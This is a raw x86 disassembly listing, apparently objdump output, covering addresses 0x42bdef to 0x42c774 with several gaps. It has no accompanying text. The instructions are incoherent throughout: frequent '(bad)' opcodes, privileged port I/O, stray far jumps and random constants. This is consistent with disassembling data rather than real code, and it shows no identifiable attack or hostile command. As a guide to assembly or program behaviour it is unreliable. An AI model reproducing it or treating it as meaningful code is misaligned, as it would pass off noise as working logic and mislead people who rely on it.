  42bdef:	add    ebx,DWORD PTR [esi+0x2b]
  42bdf2:	fisttp DWORD PTR [edi]
  42bdf4:	mov    ebx,0xf26e5493
  42bdf9:	std    
  42bdfa:	mov    ds:0xa693c2a0,ax
  42be00:	mov    bl,0x80
  42be02:	(bad)  
  42be03:	sar    edx,cl
  42be05:	repnz out 0x61,eax
  42be08:	sbb    BYTE PTR [esi+ebx*2-0x9eabcd9],bl
  42be0f:	xchg   edi,eax
  42be10:	and    eax,0xa8b557cc
  42be15:	cmp    al,bl
  42be17:	sti    
  42be18:	je     0x42be46
  42be1a:	xchg   esp,eax
  42be1b:	neg    BYTE PTR [eax-0x2690050d]
  42be21:	xor    ebp,DWORD PTR [ecx+0x1c06f80e]
  42be27:	ins    DWORD PTR es:[edi],dx
  42be28:	push   ebx
  42be29:	cs jg  0x42be1f
  42be2c:	sub    cl,BYTE PTR [ecx-0x5]
  42be2f:	into   
  42be30:	cli    
  42be31:	pop    ds
  42be32:	jle    0x42be9c
  42be34:	jae    0x42be6f
  42be36:	sub    al,0x1
  42be38:	push   eax
  42be39:	adc    al,0xd3
  42be3b:	or     al,0xed
  42be3d:	xor    bh,al
  42be3f:	fmul   DWORD PTR [edx]
  42be41:	jle    0x42be71
  42be43:	neg    BYTE PTR [ebp+0x52ad066e]
  42be49:	xchg   edx,eax
  42be4a:	jo     0x42beb6
  42be4c:	mov    ss,WORD PTR [esi-0x8c62131]
  42be52:	adc    ebp,DWORD PTR [eax+0x44]
  42be55:	sbb    eax,0xeb395796
  42be5a:	out    0xb5,eax
  42be5c:	int3   
  42be5d:	cmp    cl,BYTE PTR [eax+ebx*8+0x4a]
  42be61:	mov    WORD PTR [edx],fs
  42be63:	fild   DWORD PTR [esi-0x3c]
  42be66:	int3   
  42be67:	addr16 je 0x42bed5
  42be6a:	movzx  esi,BYTE PTR [edx+0x6be8c4ae]
  42be71:	nop
  42be72:	jp     0x42be41
  42be74:	enter  0xd279,0x7f
  42be78:	jge    0x42be96
  42be7a:	mov    ebp,0xcb459ec7
  42be7f:	inc    ecx
  42be80:	cmc    
  42be81:	dec    esp
  42be82:	imul   eax,DWORD PTR [edi+0x52],0x47
  42be86:	aaa    
  42be87:	test   edx,esp
  42be89:	ins    DWORD PTR es:[edi],dx
  42be8a:	(bad)  
  42be8b:	mov    dh,0xde
  42be8d:	mov    eax,ds:0xe6071e2b
  42be92:	loope  0x42be3c
  42be94:	cmp    BYTE PTR [ebp-0x3e],ch
  42be97:	out    0x28,eax
  42be99:	outs   dx,BYTE PTR ds:[esi]
  42be9a:	push   ecx
  42be9b:	adc    al,0xd7
  42be9d:	js     0x42bf1b
  42be9f:	dec    eax
  42bea0:	test   DWORD PTR [edi-0x6f],ebp
  42bea3:	js     0x42be8c
  42bea5:	sub    eax,0xfa64a745
  42beaa:	cmc    
  42beab:	fldcw  WORD PTR [esi-0x618f4218]
  42beb1:	hlt    
  42beb2:	out    dx,al
  42beb3:	inc    ebp
  42beb4:	(bad)  
  42beb5:	sub    eax,0x1c29cdc9
  42beba:	sub    eax,0x782e1213
  42bebf:	loope  0x42beb5
  42bec1:	rol    BYTE PTR [eax-0x5e],0x27
  42bec5:	mov    al,ds:0x78c91479
  42beca:	or     ch,dh
  42becc:	mov    bh,0xe3
  42bece:	lock cmp al,0x18
  42bed1:	js     0x42bf17
  42bed3:	sahf   
  42bed4:	cs jno 0x42bebb
  42bed7:	out    0xe1,eax
  42bed9:	cdq    
  42beda:	and    BYTE PTR [ebp+0x18],dh
  42bedd:	daa    
  42bede:	test   DWORD PTR [esi+edi*2-0x1e],ebx
  42bee2:	xchg   bh,bh
  42bee4:	jl     0x42be66
  42bee6:	and    eax,0xf5a53de0
  42beeb:	sub    ch,BYTE PTR [eax+eax*1+0x0]
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0x747bd7c8,eax
  42bf63:	cmp    dl,ah
  42bf65:	xchg   ecx,eax
  42bf66:	addr16 (bad) 
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	inc    DWORD PTR [eax]
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	clc    
  42bf6f:	rcl    DWORD PTR [ecx+esi*4-0x455a2b2],1
  42bf76:	pop    esp
  42bf77:	aaa    
  42bf78:	mov    esp,0x44c3a4e8
  42bf7d:	xor    bl,BYTE PTR [ebp+0x5fd0d51d]
  42bf83:	push   ds
  42bf84:	fs nop
  42bf86:	ror    BYTE PTR [ecx+ebx*4-0x416f5447],0xe6
  42bf8e:	in     eax,0x64
  42bf90:	and    al,0x3
  42bf92:	ficom  DWORD PTR [eax+0x1f]
  42bf95:	mov    WORD PTR [edi+0xa],?
  42bf98:	and    ch,dh
  42bf9a:	mov    esi,0x2963196c
  42bf9f:	pop    esp
  42bfa0:	mov    dh,0xb7
  42bfa2:	jo     0x42bf38
  42bfa4:	mov    ebp,0x2c54b81e
  42bfa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfab:	xchg   ebx,eax
  42bfac:	(bad)  
  42bfad:	or     dl,dh
  42bfaf:	arpl   WORD PTR [edx+0x74],bx
  42bfb2:	pop    edx
  42bfb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfb4:	sbb    ch,BYTE PTR [ecx+0x38]
  42bfb7:	jbe    0x42bf44
  42bfb9:	pushf  
  42bfba:	mov    WORD PTR [edi-0x77],ds
  42bfbd:	int    0xd8
  42bfbf:	repz pop ecx
  42bfc1:	inc    eax
  42bfc2:	mov    ds:0x579ad721,eax
  42bfc7:	mov    ch,0xcd
  42bfc9:	push   ebp
  42bfca:	pop    ebp
  42bfcb:	mov    edi,0xfe69dc06
  42bfd0:	popf   
  42bfd1:	stos   BYTE PTR es:[edi],al
  42bfd2:	ret    
  42bfd3:	and    al,0xc6
  42bfd5:	inc    esp
  42bfd6:	cmp    eax,0x6b55b551
  42bfdb:	adc    esp,DWORD PTR [ebp+0xc]
  42bfde:	mov    cl,0xec
  42bfe0:	bound  ebp,QWORD PTR [eax]
  42bfe2:	loope  0x42bfbe
  42bfe4:	inc    ebp
  42bfe5:	cmp    ecx,DWORD PTR [ecx+0x25e87937]
  42bfeb:	(bad)  
  42bfec:	out    dx,eax
  42bfed:	push   0x289df913
  42bff2:	ficom  WORD PTR [ebx]
  42bff4:	call   0xee00:0x8a658840
  42bffb:	push   ecx
  42bffc:	push   ds
  42bffd:	cmp    ebx,0xffffffdb
  42c000:	mov    eax,DWORD PTR [edi]
  42c002:	scas   al,BYTE PTR es:[edi]
  42c003:	mov    dh,BYTE PTR [eax-0x45]
  42c006:	mov    eax,0xe3870be9
  42c00b:	add    esi,DWORD PTR [ebx+0x7381761d]
  42c011:	int    0x7a
  42c013:	sbb    esp,DWORD PTR [ebp-0x307e988b]
  42c019:	cs xchg ecx,eax
  42c01b:	xchg   esp,eax
  42c01c:	les    esi,FWORD PTR [ebx+0x26e83342]
  42c022:	ret    0x3437
  42c025:	xchg   edx,eax
  42c026:	xchg   edx,eax
  42c027:	stos   DWORD PTR es:[edi],eax
  42c028:	ror    edi,0xdb
  42c02b:	inc    eax
  42c02c:	hlt    
  42c02d:	pop    es
  42c02e:	push   ss
  42c02f:	in     al,dx
  42c030:	adc    eax,0x1e69c50
  42c035:	jg     0x42c042
  42c037:	stos   BYTE PTR es:[edi],al
  42c038:	xchg   edi,eax
  42c039:	mov    DWORD PTR [ebp+eiz*8+0x0],esp
  42c03d:	(bad)  
  42c03e:	push   ebp
  42c03f:	ret    0xc81c
  42c042:	xlat   BYTE PTR ds:[ebx]
  42c043:	dec    edi
  42c044:	pop    ss
  42c045:	cld    
  42c046:	jecxz  0x42bffc
  42c048:	fwait
  42c049:	les    ebx,FWORD PTR [ecx]
  42c04b:	sbb    BYTE PTR [ecx-0xb],0x9f
  42c04f:	mov    ecx,0x76f7a52a
  42c054:	mov    dh,ch
  42c056:	add    DWORD PTR fs:[esi-0x27b5266],ebp
  42c05d:	sbb    DWORD PTR [edx+0x72],ebx
  42c060:	sbb    eax,0xdd20ddd
  42c065:	adc    BYTE PTR [edi-0x4066bb55],al
  42c06b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c06c:	out    0x0,al
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	test   eax,0x66f2ff50
  42c0e7:	xlat   BYTE PTR ds:[ebx]
  42c0e8:	add    DWORD PTR [eax],eax
  42c0ea:	inc    DWORD PTR [eax]
  42c0ec:	add    BYTE PTR [eax],al
  42c0ee:	mov    cl,0xc1
  42c0f0:	push   eax
  42c0f1:	pop    ss
  42c0f2:	ins    DWORD PTR es:[edi],dx
  42c0f3:	pop    ecx
  42c0f4:	lods   eax,DWORD PTR ds:[esi]
  42c0f5:	fwait
  42c0f6:	loope  0x42c158
  42c0f8:	push   esp
  42c0f9:	pop    esp
  42c0fa:	out    dx,al
  42c0fb:	lahf   
  42c0fc:	fdivr  QWORD PTR [ecx-0xdad2d2b]
  42c102:	cmp    DWORD PTR [edi-0x7],0x3dd13bf5
  42c109:	push   esp
  42c10a:	push   0xffffffaf
  42c10c:	ins    DWORD PTR es:[edi],dx
  42c10d:	js     0x42c164
  42c10f:	jp     0x42c10f
  42c111:	sub    BYTE PTR [ecx-0x76],bh
  42c114:	add    BYTE PTR [ebx+edi*4],dl
  42c117:	sub    al,dh
  42c119:	jg     0x42c0f3
  42c11b:	(bad)  
  42c11c:	stos   DWORD PTR es:[edi],eax
  42c11d:	mov    eax,ds:0x2c0c69aa
  42c122:	aad    0x2c
  42c124:	imul   ebp,eax,0xa7dc7186
  42c12a:	or     eax,0x45864a2a
  42c12f:	jno    0x42c0d9
  42c131:	push   ebx
  42c132:	jp     0x42c107
  42c134:	inc    edi
  42c135:	rep outs dx,BYTE PTR ds:[esi]
  42c137:	dec    ecx
  42c138:	lods   al,BYTE PTR ds:[esi]
  42c139:	sbb    DWORD PTR [esi+edx*1+0x1a],eax
  42c13d:	pusha  
  42c13e:	sub    eax,0x49dcea00
  42c143:	sbb    bh,bl
  42c145:	repz aaa 
  42c147:	inc    ecx
  42c148:	xchg   edx,eax
  42c149:	ss jne 0x42c0e9
  42c14c:	xlat   BYTE PTR ds:[ebx]
  42c14d:	fsave  [edi]
  42c150:	mov    es,esp
  42c152:	push   0x28d8e2e5
  42c157:	ret    0xa72f
  42c15a:	pop    es
  42c15b:	sbb    al,0x63
  42c15d:	int3   
  42c15e:	fadd   DWORD PTR [ebx]
  42c160:	mov    ds:0xaf99ebc2,eax
  42c165:	(bad)  
  42c166:	sub    DWORD PTR [ebx-0x37],edi
  42c169:	fimul  DWORD PTR [ebx+0x66ea348b]
  42c16f:	mov    bh,0x2
  42c171:	fwait
  42c172:	cmp    BYTE PTR [edx],cl
  42c174:	cs inc ebp
  42c176:	sub    DWORD PTR [eax-0x5e],edx
  42c179:	inc    edi
  42c17a:	into   
  42c17b:	dec    esi
  42c17c:	outs   dx,DWORD PTR ds:[esi]
  42c17d:	or     al,0x0
  42c17f:	(bad)  
  42c180:	adc    al,0xf9
  42c182:	loope  0x42c12b
  42c184:	rol    eax,1
  42c186:	aaa    
  42c187:	es sahf 
  42c189:	mov    ah,0xca
  42c18b:	inc    ecx
  42c18c:	test   al,0x5d
  42c18e:	pushf  
  42c18f:	iret   
  42c190:	cmp    eax,0xd85b6289
  42c195:	push   ds
  42c196:	and    BYTE PTR [edx-0x1bd89f8f],bh
  42c19c:	das    
  42c19d:	xchg   BYTE PTR [ebx-0x56],cl
  42c1a0:	shl    BYTE PTR [edx+0x35e93dd],1
  42c1a6:	mov    eax,ds:0x4744ccc3
  42c1ab:	push   esi
  42c1ac:	jb     0x42c1be
  42c1ae:	and    eax,DWORD PTR [esp+esi*2-0x61]
  42c1b2:	outs   dx,DWORD PTR ds:[esi]
  42c1b3:	(bad)  
  42c1b5:	icebp  
  42c1b6:	mov    ebp,0x637927f1
  42c1bb:	dec    ebx
  42c1bc:	es push ds
  42c1be:	inc    ebx
  42c1bf:	sub    edx,DWORD PTR [ebx-0x28]
  42c1c2:	ret    0xec91
  42c1c5:	repnz push edi
  42c1c7:	(bad)  
  42c1c8:	cmp    BYTE PTR [edx],dh
  42c1ca:	lds    eax,FWORD PTR [eax-0xb]
  42c1cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1ce:	fst    DWORD PTR [eax]
  42c1d0:	enter  0x2e5f,0xb6
  42c1d4:	(bad)  
  42c1d5:	xor    DWORD PTR [edi],edx
  42c1d7:	iret   
  42c1d8:	add    cl,dh
  42c1da:	pop    eax
  42c1db:	mov    ebx,0x2d766cac
  42c1e0:	fcomip st,st(7)
  42c1e2:	mov    eax,0x83cdd01b
  42c1e7:	xor    ah,bl
  42c1e9:	inc    ebp
  42c1ea:	mov    edx,0xeb7e
	...
  42c253:	add    BYTE PTR [eax],al
  42c255:	add    BYTE PTR [ecx-0x7e],ch
  42c258:	int    0xae
  42c25a:	out    dx,eax
  42c25b:	out    dx,eax
  42c25c:	imul   eax,edi,0xfffffff2
  42c25f:	nop
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	loopne 0x42c2ab
  42c264:	sti    
  42c265:	mov    ebp,0x1d865
  42c26a:	inc    DWORD PTR [eax]
  42c26c:	add    BYTE PTR [eax],al
  42c26e:	push   0xffffff89
  42c270:	dec    esi
  42c271:	mov    ebp,0x86af6bb0
  42c276:	mov    esp,0xa5e6c447
  42c27b:	(bad)  
  42c27d:	sbb    bh,bl
  42c27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c281:	add    BYTE PTR [ebx+0x5],cl
  42c284:	fdivrp st(1),st
  42c286:	inc    ebx
  42c287:	stc    
  42c288:	cwde   
  42c289:	dec    ecx
  42c28a:	arpl   WORD PTR [esi-0x23e2a675],dx
  42c290:	iret   
  42c291:	dec    ebx
  42c292:	outs   dx,DWORD PTR ds:[esi]
  42c293:	(bad)  
  42c294:	mov    al,ds:0x996fdea9
  42c299:	pop    ecx
  42c29a:	gs ins DWORD PTR es:[edi],dx
  42c29c:	out    dx,eax
  42c29d:	and    BYTE PTR [ecx-0x69],0x34
  42c2a1:	sub    cl,0x87
  42c2a4:	lods   al,BYTE PTR ds:[esi]
  42c2a5:	sub    eax,0x8b283054
  42c2aa:	mov    esi,0x18976e1a
  42c2af:	lods   eax,DWORD PTR ds:[esi]
  42c2b0:	adc    ecx,DWORD PTR [ecx]
  42c2b2:	xchg   ebx,eax
  42c2b3:	xchg   esp,eax
  42c2b4:	jl     0x42c2bc
  42c2b6:	pop    ecx
  42c2b7:	inc    eax
  42c2b8:	(bad)  
  42c2b9:	dec    esp
  42c2ba:	pop    esp
  42c2bb:	in     eax,0x28
  42c2bd:	(bad)  
  42c2be:	(bad)  
  42c2c0:	rcr    BYTE PTR [ebx+0x50],cl
  42c2c3:	sub    eax,0xa1a2df05
  42c2c8:	inc    ecx
  42c2c9:	fdiv   QWORD PTR [edx+0x48]
  42c2cc:	(bad)  
  42c2cd:	pushf  
  42c2ce:	in     eax,0x19
  42c2d0:	(bad)  
  42c2d1:	push   ebp
  42c2d2:	data16 cmp ch,BYTE PTR [ecx+0x15]
  42c2d6:	rcl    DWORD PTR [eax+0x14a4de06],0xb3
  42c2dd:	push   cs
  42c2de:	xchg   BYTE PTR [edx],ch
  42c2e0:	inc    esi
  42c2e1:	sahf   
  42c2e2:	inc    edx
  42c2e3:	das    
  42c2e4:	mov    WORD PTR [edx-0xc],cs
  42c2e7:	xlat   BYTE PTR ds:[ebx]
  42c2e8:	cmp    DWORD PTR [edi-0x70aa25f4],0x4be4c852
  42c2f2:	popa   
  42c2f3:	arpl   ax,sp
  42c2f5:	outs   dx,DWORD PTR ds:[esi]
  42c2f6:	fwait
  42c2f7:	mov    DWORD PTR [ebp-0x42],esi
  42c2fa:	icebp  
  42c2fb:	sub    al,0x5d
  42c2fd:	mov    dh,0x9e
  42c2ff:	std    
  42c300:	push   ss
  42c301:	popf   
  42c302:	inc    ecx
  42c303:	int    0xf8
  42c305:	push   ecx
  42c306:	int    0xe4
  42c308:	xchg   edx,eax
  42c309:	shr    BYTE PTR [edx+0x77],cl
  42c30c:	dec    ecx
  42c30d:	pop    esi
  42c30e:	or     DWORD PTR [eax-0x4c564af3],0xffffffdb
  42c315:	push   es
  42c316:	rcl    BYTE PTR [ebx],0x6d
  42c319:	les    ebp,FWORD PTR [esi-0x6a]
  42c31c:	and    edx,DWORD PTR [ebx]
  42c31e:	jge    0x42c2ef
  42c320:	dec    ebp
  42c321:	aad    0x3e
  42c323:	aaa    
  42c324:	mov    dh,0x2a
  42c326:	jg     0x42c374
  42c328:	jb     0x42c2c6
  42c32a:	daa    
  42c32b:	jg     0x42c2c2
  42c32d:	cmp    al,dl
  42c32f:	and    al,0x7c
  42c331:	aaa    
  42c332:	(bad)  [ebx]
  42c334:	push   ebx
  42c335:	dec    eax
  42c336:	or     cl,BYTE PTR [esi+ecx*2]
  42c339:	push   es
  42c33a:	pop    ebp
  42c33b:	mov    bl,0x57
  42c33d:	xor    bh,BYTE PTR [esi]
  42c33f:	stos   DWORD PTR es:[edi],eax
  42c340:	xchg   ecx,eax
  42c341:	jle    0x42c398
  42c343:	popf   
  42c344:	mov    ds:0x6f8a04ed,eax
  42c349:	mov    al,BYTE PTR [edx+0x54]
  42c34c:	mov    al,ds:0x12e00414
  42c351:	push   edi
  42c352:	inc    edi
  42c353:	stos   DWORD PTR es:[edi],eax
  42c354:	dec    ebp
  42c355:	fs adc al,0xfe
  42c359:	jmp    0x6bd65ffb
  42c35e:	(bad)  
  42c360:	pushf  
  42c361:	xlat   BYTE PTR ds:[ebx]
  42c362:	add    dl,BYTE PTR [edi+0x4bb503ba]
  42c368:	pop    edx
  42c369:	xchg   ebp,eax
  42c36a:	xchg   DWORD PTR [eax+edi*4],esp
	...
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x76a2bf6
  42c3e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c3e6:	fld    DWORD PTR fs:[ecx]
  42c3e9:	add    bh,bh
  42c3eb:	add    BYTE PTR [eax],al
  42c3ed:	add    BYTE PTR [edx-0x4d],al
  42c3f0:	jp     0x42c373
  42c3f2:	sahf   
  42c3f3:	in     al,dx
  42c3f4:	xchg   edi,eax
  42c3f5:	cmp    eax,0x6e8f81e4
  42c3fa:	jg     0x42c454
  42c3fc:	int    0x81
  42c3fe:	ret    
  42c3ff:	scas   al,BYTE PTR es:[edi]
  42c400:	adc    bh,ch
  42c402:	jl     0x42c3c5
  42c404:	pop    ebp
  42c405:	jns    0x42c457
  42c407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c408:	xchg   ecx,eax
  42c409:	ficom  WORD PTR [eax]
  42c40b:	dec    ebp
  42c40c:	push   cs
  42c40d:	gs or  al,0xd4
  42c411:	imul   eax,DWORD PTR [edi-0x5c41f9],0xcfd0536a
  42c41b:	outs   dx,DWORD PTR ds:[esi]
  42c41c:	sub    eax,0xf26b40ff
  42c421:	jecxz  0x42c49a
  42c423:	es clc 
  42c425:	pmulhuw mm3,QWORD PTR [edx]
  42c428:	lahf   
  42c429:	int    0x71
  42c42b:	test   bl,bh
  42c42d:	adc    edx,DWORD PTR [esi-0x24]
  42c430:	enter  0xa9b4,0x2
  42c434:	rol    al,cl
  42c436:	adc    BYTE PTR [ecx-0x1],bl
  42c439:	pop    ds
  42c43a:	adc    ch,BYTE PTR [ecx+0x722ba88b]
  42c440:	jno    0x42c472
  42c442:	add    BYTE PTR [ecx+0x336009ad],ch
  42c448:	popa   
  42c449:	inc    ebx
  42c44a:	leave  
  42c44b:	xchg   ebx,eax
  42c44c:	xor    al,0xad
  42c44e:	xor    ecx,DWORD PTR [esi+ecx*2]
  42c451:	xchg   ebp,eax
  42c452:	pop    ss
  42c453:	aam    0x0
  42c455:	cdq    
  42c456:	mov    es,eax
  42c458:	pop    esp
  42c459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c45a:	mov    dh,0x8
  42c45c:	fnstcw WORD PTR [ebp+0x7]
  42c45f:	mov    al,0x22
  42c461:	ins    DWORD PTR es:[edi],dx
  42c462:	xor    dl,BYTE PTR [ecx-0xb]
  42c465:	popf   
  42c466:	int    0x58
  42c468:	repnz pop ecx
  42c46a:	inc    esi
  42c46b:	push   es
  42c46c:	dec    eax
  42c46d:	pop    esi
  42c46e:	test   al,0x50
  42c470:	shl    DWORD PTR [ebx+0xb0416d],1
  42c476:	add    DWORD PTR [edx-0x4c],0x4a
  42c47a:	arpl   WORD PTR [ebx-0x34],di
  42c47d:	nop
  42c47e:	or     al,0xa6
  42c480:	daa    
  42c481:	xlat   BYTE PTR ds:[ebx]
  42c482:	neg    BYTE PTR [ebp-0x34aa48e6]
  42c488:	scas   eax,DWORD PTR es:[edi]
  42c489:	xor    eax,0x54de0ee5
  42c48e:	addr16 loope 0x42c4b2
  42c491:	pop    esp
  42c492:	fld    DWORD PTR [edx]
  42c494:	aaa    
  42c495:	ja     0x42c4ae
  42c497:	fs inc edx
  42c499:	test   BYTE PTR [esi-0x36f01875],dl
  42c49f:	(bad)  
  42c4a0:	lea    ebp,[eax+0x4624dbce]
  42c4a6:	dec    eax
  42c4a7:	push   ecx
  42c4a8:	jle    0x42c4f9
  42c4aa:	push   ebp
  42c4ab:	xchg   esp,eax
  42c4ac:	rcr    BYTE PTR [ebp-0x7d],cl
  42c4af:	(bad)  
  42c4b0:	push   0xd0dd5770
  42c4b5:	dec    eax
  42c4b6:	rol    DWORD PTR [edx],cl
  42c4b8:	and    DWORD PTR [ebp+ebp*2-0x7f1d996d],eax
  42c4bf:	add    dh,al
  42c4c1:	lock ins BYTE PTR es:[edi],dx
  42c4c3:	pop    esi
  42c4c4:	out    dx,eax
  42c4c5:	int    0xaf
  42c4c7:	aad    0x6f
  42c4c9:	clc    
  42c4ca:	bound  esi,QWORD PTR [ecx]
  42c4cc:	pop    esp
  42c4cd:	mov    edi,0x7339f041
  42c4d3:	push   0xffffffc6
  42c4d5:	aaa    
  42c4d6:	jae    0x42c47e
  42c4d8:	adc    ebx,eax
  42c4da:	(bad)  
  42c4db:	and    BYTE PTR [eax-0x521f3250],ah
  42c4e1:	push   0xdd4a9f3e
  42c4e6:	mov    ds:0x4dbf745e,eax
  42c4eb:	push   ebx
  42c4ec:	mov    edi,0x0
	...
  42c555:	add    ah,ch
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x1634,0xbd
  42c564:	idiv   ah
  42c566:	arpl   dx,bx
  42c568:	add    DWORD PTR [eax],eax
  42c56a:	inc    DWORD PTR [eax]
  42c56c:	add    BYTE PTR [eax],al
  42c56e:	push   edx
  42c56f:	or     ebp,DWORD PTR [ebp-0x59]
  42c572:	or     eax,0x323c9f00
  42c577:	mov    dh,0x2
  42c579:	jl     0x42c5d9
  42c57b:	into   
  42c57c:	adc    BYTE PTR [edi+0x6ea757b7],ch
  42c582:	pop    ebx
  42c583:	dec    DWORD PTR [ebp+0x17]
  42c586:	dec    ebp
  42c587:	test   eax,0x65375884
  42c58c:	push   ecx
  42c58d:	clc    
  42c58e:	push   ebx
  42c58f:	fadd   DWORD PTR [eax-0x73]
  42c592:	mov    cl,0x6d
  42c594:	push   eax
  42c595:	pop    ds
  42c596:	jo     0x42c5d5
  42c598:	and    esi,DWORD PTR [edi+ecx*2-0x4c4446ad]
  42c59f:	xchg   edx,eax
  42c5a0:	mov    esi,0x34da3d1f
  42c5a5:	ins    DWORD PTR es:[edi],dx
  42c5a6:	(bad)
  42c5a9:	cmp    al,0x3
  42c5ab:	icebp  
  42c5ac:	hlt    
  42c5ad:	jns    0x42c5fc
  42c5af:	js     0x42c5b6
  42c5b1:	fwait
  42c5b2:	jno    0x42c570
  42c5b4:	jb     0x42c588
  42c5b6:	push   0xb3231c70
  42c5bb:	nop
  42c5bc:	mov    dh,0x1
  42c5be:	test   eax,0x2a1c15fc
  42c5c3:	lea    edx,[ebp-0x71]
  42c5c6:	mov    ebx,0x8b009222
  42c5cb:	sub    ebp,DWORD PTR [eax]
  42c5cd:	or     eax,0xdf65f207
  42c5d2:	cmp    bl,BYTE PTR [ebp+0x2922eec8]
  42c5d8:	mov    esi,0xa6bbf3d6
  42c5dd:	cmp    cl,BYTE PTR [eax+ebx*2]
  42c5e0:	adc    dh,BYTE PTR [ebx+0xc]
  42c5e3:	les    ebp,FWORD PTR [edx+0x1f]
  42c5e6:	nop
  42c5e7:	fnstenv [edi+ecx*1+0x1b]
  42c5eb:	pop    edi
  42c5ec:	jg     0x1ef266ac
  42c5f2:	cmp    DWORD PTR [ebx+0x3e],esp
  42c5f5:	test   al,0xc0
  42c5f7:	enter  0xd31f,0x5a
  42c5fb:	sbb    al,0xf0
  42c5fd:	int    0xd7
  42c5ff:	bnd ja 0x42c65c
  42c602:	jecxz  0x42c613
  42c604:	push   eax
  42c605:	jl     0x42c5d4
  42c607:	push   cs
  42c608:	pop    esi
  42c609:	addr16 pushf 
  42c60b:	dec    esi
  42c60c:	pop    es
  42c60d:	mov    ds:0x3bc7c929,al
  42c612:	mov    ebp,0xd97ed61b
  42c617:	pop    ss
  42c618:	stc    
  42c619:	add    al,0xa2
  42c61b:	xchg   edx,eax
  42c61c:	mov    BYTE PTR [ebp+0x67],dl
  42c61f:	mov    esi,0xc1b417ab
  42c624:	push   ebx
  42c625:	adc    DWORD PTR [eax],0x6aa2374e
  42c62b:	jo     0x42c652
  42c62d:	adc    DWORD PTR [ecx+0x72],ecx
  42c630:	out    0x83,eax
  42c632:	or     DWORD PTR [esi+0xb],0x1dc88563
  42c639:	aam    0x1e
  42c63b:	jmp    0x42c667
  42c63d:	sbb    BYTE PTR [eax],cl
  42c63f:	xchg   DWORD PTR [esi],ecx
  42c641:	cwde   
  42c642:	jge    0x42c5ec
  42c644:	inc    edi
  42c645:	fild   DWORD PTR ds:0x28664326
  42c64b:	(bad)  
  42c64c:	push   ds
  42c64d:	ret    0xd41f
  42c650:	mov    ebp,0xd6a7628
  42c655:	adc    eax,0x7df0d14d
  42c65a:	out    0x73,eax
  42c65c:	lock sbb al,0x50
  42c65f:	ret    
  42c660:	out    dx,eax
  42c661:	out    0x4e,eax
  42c663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c664:	dec    esi
  42c665:	sahf   
  42c666:	loopne 0x42c6d3
  42c668:	je     0x42c6c5
  42c66a:	in     al,0xe7
  42c66c:	imul   eax,DWORD PTR [eax],0x0
	...
  42c6d3:	add    BYTE PTR [eax],al
  42c6d5:	add    BYTE PTR [ebp+0x48],bl
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x2f6dfc6b]
  42c6e3:	mov    edx,ecx
  42c6e5:	push   edi
  42c6e6:	(bad)  
  42c6e7:	fild   DWORD PTR [ecx]
  42c6e9:	add    bh,bh
  42c6eb:	add    BYTE PTR [eax],al
  42c6ed:	add    BYTE PTR ds:0x5ff7df9,dh
  42c6f3:	adc    esp,esi
  42c6f5:	jp     0x42c6bc
  42c6f7:	or     al,0x6e
  42c6f9:	push   ecx
  42c6fa:	or     eax,DWORD PTR [esi+0x1b]
  42c6fd:	int3   
  42c6fe:	add    eax,DWORD PTR ds:0xef69dfb
  42c704:	call   0x7d511847
  42c709:	sub    bh,BYTE PTR [eax]
  42c70b:	mov    ch,0x13
  42c70d:	(bad)  
  42c70e:	pop    ds
  42c70f:	pop    esi
  42c710:	ins    BYTE PTR es:[edi],dx
  42c711:	jmp    0xc6d46053
  42c716:	imul   edi,DWORD PTR [ebx],0xffffffdb
  42c719:	cmp    bh,BYTE PTR [ecx]
  42c71b:	xchg   ebp,eax
  42c71c:	jmp    0x42c739
  42c71e:	lock mov ds:0x9ce7165e,eax
  42c724:	rcr    BYTE PTR es:[edi+0x3],0xfa
  42c729:	test   al,0xbe
  42c72b:	push   ds
  42c72c:	cli    
  42c72d:	jmp    0x40bbe80c
  42c732:	fcmovnu st,st(1)
  42c734:	sbb    eax,0xd737ade9
  42c739:	jns    0x42c6c5
  42c73b:	sahf   
  42c73c:	sbb    edx,eax
  42c73e:	jecxz  0x42c6e9
  42c740:	les    ecx,FWORD PTR ds:0xdb87df58
  42c746:	fwait
  42c747:	daa    
  42c748:	aam    0xd2
  42c74a:	int    0x2a
  42c74c:	cmp    eax,0x2ef96e2
  42c751:	jl     0x42c6dc
  42c753:	push   0x32
  42c755:	or     ebx,esi
  42c757:	div    si
  42c75a:	push   ds
  42c75b:	pop    ecx
  42c75c:	fmul   DWORD PTR [ecx-0x758900da]
  42c762:	mov    edx,cs
  42c764:	pop    ebp
  42c765:	stos   BYTE PTR es:[edi],al
  42c766:	push   edi
  42c767:	push   edx
  42c769:	rcl    BYTE PTR [ebp-0x2a7e567d],cl
  42c76f:	out    0x52,al
  42c771:	sahf   
  42c772:	jecxz  0x42c7c3
  42c774:	adc    ecx,eax
